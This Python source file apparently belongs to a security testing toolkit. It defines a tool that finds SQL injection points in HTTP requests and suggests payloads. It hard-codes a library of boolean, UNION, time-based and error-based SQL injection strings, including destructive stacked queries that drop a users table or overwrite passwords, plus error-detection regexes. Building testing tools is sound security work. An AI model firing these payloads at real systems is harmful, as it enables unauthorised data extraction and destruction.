import re
import json
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, parse_qs
from ..config import Settings


class PayloadSuggestorSQLiTool:
    """
    A specialized tool for analyzing HTTP requests and responses to suggest
    SQL injection payloads and optimal injection positions.
    """
    
    def __init__(self, settings: Settings):
        self.settings = settings
        
        # Common SQL injection payloads categorized by type
        self.payloads = {
            "boolean_blind": [
                "' AND '1'='1",
                "' AND '1'='2",
                "\" AND \"1\"=\"1",
                "\" AND \"1\"=\"2",
                "') AND ('1'='1",
                "') AND ('1'='2",
                "1' AND '1'='1",
                "1' AND '1'='2"
            ],
            "union_based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT version(),user(),database()--",
                "\" UNION SELECT NULL--",
                "1 UNION SELECT NULL--"
            ],
            "time_based": [
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; SELECT pg_sleep(5)--"
            ],
            "error_based": [
                "'",
                "\"",
                "\\",
                "'\"",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ],
            "stacked_queries": [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES ('admin','password')--",
                "'; UPDATE users SET password='hacked' WHERE id=1--"
            ]
        }
        
        # SQL injection indicators in responses
        self.sql_error_patterns = [
            r"mysql_fetch_array\(\)",
            r"ORA-\d{5}",
            r"Microsoft.*ODBC.*SQL Server",
            r"PostgreSQL.*ERROR",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"SQLite.*error",
            r"sqlite3.OperationalError",
            r"ORA-01756",
            r"Microsoft JET Database",
            r"ODBC Microsoft Access Driver"
        ]
    
    def run(self, input_data: str) -> str:
        """
        Main entry point for the tool. Analyzes HTTP request/response data
        and returns SQL injection payload suggestions.
        """
        try:
            # Parse input data (expected to be JSON with request/response)
            data = json.loads(input_data)
            
            http_request = data.get("request", {})
            http_response = data.get("response", {})
            
            # Analyze the request and response
            analysis_result = self._analyze_request_response(http_request, http_response)
            
            return json.dumps(analysis_result, indent=2)
            
        except json.JSONDecodeError:
            return json.dumps({
                "error": "Invalid JSON input. Expected format: {'request': {...}, 'response': {...}}"
            })
        except Exception as e:
            return json.dumps({
                "error": f"Analysis failed: {str(e)}"
            })
    
    def _analyze_request_response(self, request: Dict, response: Dict) -> Dict[str, Any]:
        """
        Analyze HTTP request and response to suggest SQL injection payloads.
        """
        result = {
            "injection_points": [],
            "payload_suggestions": [],
            "vulnerability_indicators": [],
            "recommended_payloads": []
        }
        
        # Analyze request for injection points
        injection_points = self._find_injection_points(request)
        result["injection_points"] = injection_points
        
        # Analyze response for SQL error indicators
        sql_indicators = self._analyze_response_for_sql_errors(response)
        result["vulnerability_indicators"] = sql_indicators
        
        # Generate payload suggestions based on analysis
        payload_suggestions = self._generate_payload_suggestions(injection_points, sql_indicators)
        result["payload_suggestions"] = payload_suggestions
        
        # Recommend specific payloads based on context
        recommended = self._recommend_payloads(injection_points, sql_indicators)
        result["recommended_payloads"] = recommended
        
        return result
    
    def _find_injection_points(self, request: Dict) -> List[Dict[str, Any]]:
        """
        Identify potential SQL injection points in the HTTP request.
        """
        injection_points = []
        
        # Analyze URL parameters
        url = request.get("url", "")
        parsed_url = urlparse(url)
        
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            for param_name, param_values in params.items():
                for i, value in enumerate(param_values):
                    injection_points.append({
                        "location": "url_parameter",
                        "parameter": param_name,
                        "value": value,
                        "position": {
                            "type": "url_parameter",
                            "parameter_name": param_name,
                            "parameter_index": i
                        },
                        "risk_level": self._assess_parameter_risk(param_name, value)
                    })
        
        # Analyze POST data
        body = request.get("body", "")
        if body:
            # Try to parse as JSON
            try:
                json_data = json.loads(body)
                if isinstance(json_data, dict):
                    for key, value in json_data.items():
                        injection_points.append({
                            "location": "json_body",
                            "parameter": key,
                            "value": str(value),
                            "position": {
                                "type": "json_body",
                                "key": key
                            },
                            "risk_level": self._assess_parameter_risk(key, str(value))
                        })
            except json.JSONDecodeError:
                # Try to parse as form data
                if "=" in body and "&" in body:
                    form_params = parse_qs(body)
                    for param_name, param_values in form_params.items():
                        for i, value in enumerate(param_values):
                            injection_points.append({
                                "location": "form_data",
                                "parameter": param_name,
                                "value": value,
                                "position": {
                                    "type": "form_data",
                                    "parameter_name": param_name,
                                    "parameter_index": i
                                },
                                "risk_level": self._assess_parameter_risk(param_name, value)
                            })
        
        # Analyze headers for potential injection points
        headers = request.get("headers", {})
        for header_name, header_value in headers.items():
            if header_name.lower() in ["user-agent", "referer", "x-forwarded-for", "cookie"]:
                injection_points.append({
                    "location": "header",
                    "parameter": header_name,
                    "value": header_value,
                    "position": {
                        "type": "header",
                        "header_name": header_name
                    },
                    "risk_level": "medium"
                })
        
        return injection_points
    
    def _assess_parameter_risk(self, param_name: str, param_value: str) -> str:
        """
        Assess the risk level of a parameter for SQL injection.
        """
        # High-risk parameter names
        high_risk_names = ["id", "user", "username", "email", "search", "query", "filter"]
        
        # High-risk if parameter name suggests database interaction
        if any(risk_name in param_name.lower() for risk_name in high_risk_names):
            return "high"
        
        # Medium-risk if value contains numbers (potential ID)
        if param_value.isdigit():
            return "medium"
        
        # Medium-risk if value contains SQL-like keywords
        sql_keywords = ["select", "union", "where", "order", "group"]
        if any(keyword in param_value.lower() for keyword in sql_keywords):
            return "high"
        
        return "low"
    
    def _analyze_response_for_sql_errors(self, response: Dict) -> List[Dict[str, Any]]:
        """
        Analyze HTTP response for SQL error indicators.
        """
        indicators = []
        
        response_body = response.get("body", "")
        status_code = response.get("status_code", 200)
        
        # Check for SQL error patterns in response body
        for pattern in self.sql_error_patterns:
            matches = re.finditer(pattern, response_body, re.IGNORECASE)
            for match in matches:
                indicators.append({
                    "type": "sql_error_pattern",
                    "pattern": pattern,
                    "match": match.group(),
                    "position": match.start(),
                    "severity": "high"
                })
        
        # Check for database-specific error messages
        db_errors = {
            "mysql": ["mysql", "mysqli", "you have an error in your sql syntax"],
            "postgresql": ["postgresql", "pg_query", "invalid input syntax"],
            "oracle": ["ora-", "oracle", "oracleexception"],
            "mssql": ["microsoft sql", "sqlserver", "mssql"],
            "sqlite": ["sqlite", "database is locked"]
        }
        
        response_lower = response_body.lower()
        for db_type, error_keywords in db_errors.items():
            for keyword in error_keywords:
                if keyword in response_lower:
                    indicators.append({
                        "type": "database_error",
                        "database_type": db_type,
                        "keyword": keyword,
                        "severity": "high"
                    })
        
        # Check for unusual status codes that might indicate injection
        if status_code in [500, 502, 503]:
            indicators.append({
                "type": "error_status_code",
                "status_code": status_code,
                "severity": "medium"
            })
        
        return indicators
    
    def _generate_payload_suggestions(self, injection_points: List, indicators: List) -> List[Dict[str, Any]]:
        """
        Generate payload suggestions based on injection points and indicators.
        """
        suggestions = []
        
        # If SQL errors detected, prioritize error-based payloads
        if any(ind["type"] == "sql_error_pattern" for ind in indicators):
            for payload in self.payloads["error_based"][:3]:
                suggestions.append({
                    "payload": payload,
                    "type": "error_based",
                    "description": "Exploit existing SQL error conditions",
                    "risk_level": "high",
                    "applicable_points": [point["parameter"] for point in injection_points if point["risk_level"] == "high"]
                })
        
        # Add boolean-based payloads for high-risk parameters
        high_risk_points = [point for point in injection_points if point["risk_level"] == "high"]
        if high_risk_points:
            for payload in self.payloads["boolean_blind"][:2]:
                suggestions.append({
                    "payload": payload,
                    "type": "boolean_blind",
                    "description": "Test for boolean-based blind SQL injection",
                    "risk_level": "medium",
                    "applicable_points": [point["parameter"] for point in high_risk_points]
                })
        
        # Add union-based payloads if multiple parameters detected
        if len(injection_points) > 1:
            for payload in self.payloads["union_based"][:2]:
                suggestions.append({
                    "payload": payload,
                    "type": "union_based",
                    "description": "Attempt to extract data using UNION queries",
                    "risk_level": "high",
                    "applicable_points": [point["parameter"] for point in injection_points]
                })
        
        # Add time-based payloads for comprehensive testing
        for payload in self.payloads["time_based"][:2]:
            suggestions.append({
                "payload": payload,
                "type": "time_based",
                "description": "Test for time-based blind SQL injection",
                "risk_level": "medium",
                "applicable_points": [point["parameter"] for point in injection_points]
            })
        
        return suggestions[:10]  # Limit to 10 suggestions
    
    def _recommend_payloads(self, injection_points: List, indicators: List) -> List[Dict[str, Any]]:
        """
        Recommend specific payloads with injection positions.
        """
        recommendations = []
        
        # Prioritize high-risk injection points
        high_risk_points = [point for point in injection_points if point["risk_level"] == "high"]
        
        for point in high_risk_points[:5]:  # Limit to top 5 high-risk points
            # Recommend specific payload based on parameter type
            if point["location"] == "url_parameter":
                payload = "' AND '1'='1"
                recommendations.append({
                    "injection_point": point,
                    "recommended_payload": payload,
                    "full_test_url": self._build_test_url(point, payload),
                    "reasoning": f"Parameter '{point['parameter']}' appears to be a high-risk injection point in URL parameters",
                    "next_steps": [
                        f"Test with payload: {payload}",
                        "Compare response times and content",
                        "If successful, escalate to UNION-based extraction"
                    ]
                })
        
        return recommendations
    
    def _build_test_url(self, injection_point: Dict, payload: str) -> str:
        """
        Build a test URL with the payload injected at the specified point.
        """
        # This is a simplified implementation
        # In a real scenario, you'd properly reconstruct the URL
        if injection_point["location"] == "url_parameter":
            param_name = injection_point["parameter"]
            return f"Original URL with {param_name}={injection_point['value']}{payload}"
        
        return "Test URL would be constructed based on injection point"